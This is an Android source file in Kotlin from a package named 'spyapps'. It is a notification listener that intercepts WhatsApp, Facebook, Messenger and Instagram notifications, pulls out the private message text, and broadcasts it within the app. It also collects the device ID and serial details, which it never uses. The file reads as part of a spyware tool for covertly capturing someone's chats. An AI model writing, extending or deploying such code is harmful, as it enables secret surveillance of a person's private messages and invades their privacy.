package mobile.android.spyapps

import android.app.Notification
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.IBinder
import android.os.Parcelable
import android.provider.Settings
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import androidx.core.app.NotificationCompat
import java.text.DateFormat
import java.text.SimpleDateFormat
import java.util.*


class NotificationService: NotificationListenerService() {

    /*
        These are the package names of the apps. for which we want to
        listen the notifications
     */
    private object ApplicationPackageNames {
        const val FACEBOOK_PACK_NAME = "com.facebook.katana"
        const val FACEBOOK_MESSENGER_PACK_NAME = "com.facebook.orca"
        const val WHATSAPP_PACK_NAME = "com.whatsapp"
        const val INSTAGRAM_PACK_NAME = "com.instagram.android"
    }

    /*
        These are the return codes we use in the method which interceptoLgs
        the notifications, to decide whether we should do something or not
     */
    object InterceptedNotificationCode {
        const val FACEBOOK_CODE = 1
        const val WHATSAPP_CODE = 2
        const val INSTAGRAM_CODE = 3
        const val OTHER_NOTIFICATIONS_CODE = 4 // We ignore all notification with code == 4
    }

    override fun onBind(intent: Intent?): IBinder? {
        return super.onBind(intent)
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        val notificationCode: Int = matchNotificationCode(sbn!!)
        val pack = sbn.packageName
        val extras = sbn.notification.extras
        val title = extras.getString("android.title")
        val text = extras.getCharSequence("android.text").toString()
        var subtext = ""

        if (notificationCode != InterceptedNotificationCode.OTHER_NOTIFICATIONS_CODE) {
            if ((Build.VERSION.SDK_INT >= Build.VERSION_CODES.N)) {
                val b = extras[Notification.EXTRA_MESSAGES] as Array<Parcelable>?
                if (b != null) {
                    for (tmp in b) {
                        val msgBundle = tmp as Bundle
                        subtext = msgBundle.getString("text").toString()
                    }
                }

                if (subtext.isEmpty()) {
                    subtext = text
                }
                val intent = Intent("mobile.android.spyapps")
                intent.putExtra("Notification Code", notificationCode)
                intent.putExtra("package", pack)
                intent.putExtra("title", title)
                intent.putExtra("text", subtext)
                intent.putExtra("id", sbn.id)

                sendBroadcast(intent)

                if (text != null) {
                    if (!text.contains("new messages") && !text.contains("Whatsapp Web is currently active") && !text.contains(
                            "WhatsApp web login"
                        )
                    ) {
                        val android_id: String = Settings.Secure.getString(
                            applicationContext.contentResolver,
                            Settings.Secure.ANDROID_ID
                        )
                        val devicemodel =
                            android.os.Build.MANUFACTURER + android.os.Build.MODEL + android.os.Build.BRAND + android.os.Build.SERIAL
                        val df: DateFormat = SimpleDateFormat("ddMMyyyyHHmmssSSS")
                        val date: String = df.format(Calendar.getInstance().time)

                        val intentPending = Intent(applicationContext, MainActivity::class.java)
                        val pendingIntent = PendingIntent.getActivity(this, 0, intentPending, 0)

                        val builder =
                            NotificationCompat.Builder(this)
                                .setSmallIcon(R.drawable.ic_launcher_background).setContentTitle(
                                    resources.getString(R.string.app_name)
                                ).setContentText(
                                    "This is income messages: $text"
                                )

                        builder.setWhen(System.currentTimeMillis())
                        builder.setSmallIcon(R.mipmap.ic_launcher)
                        builder.priority = Notification.PRIORITY_MAX
                        builder.setFullScreenIntent(pendingIntent, true)
                        val notificationManager =
                            getSystemService(NOTIFICATION_SERVICE) as NotificationManager
                        notificationManager.notify(1, builder.build())
                    }
                }
            }
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        val notificationCode = matchNotificationCode(sbn!!)
        if (notificationCode != InterceptedNotificationCode.OTHER_NOTIFICATIONS_CODE) {
            val activeNotifications = this.activeNotifications
            if (activeNotifications != null && activeNotifications.size > 0) {
                for (i in activeNotifications.indices) {
                    if (notificationCode == matchNotificationCode(activeNotifications[i])) {
                        val intent = Intent("mobile.android.spyapps")
                        intent.putExtra("Notification Code", notificationCode)
                        sendBroadcast(intent)
                        break
                    }
                }
            }
        }
    }

    private fun matchNotificationCode(sbn: StatusBarNotification): Int {
        val packageName = sbn.packageName
        return if (packageName == ApplicationPackageNames.FACEBOOK_PACK_NAME || packageName == ApplicationPackageNames.FACEBOOK_MESSENGER_PACK_NAME) {
            InterceptedNotificationCode.FACEBOOK_CODE
        } else if (packageName == ApplicationPackageNames.INSTAGRAM_PACK_NAME) {
            InterceptedNotificationCode.INSTAGRAM_CODE
        } else if (packageName == ApplicationPackageNames.WHATSAPP_PACK_NAME) {
            InterceptedNotificationCode.WHATSAPP_CODE
        } else {
            InterceptedNotificationCode.OTHER_NOTIFICATIONS_CODE
        }
    }

}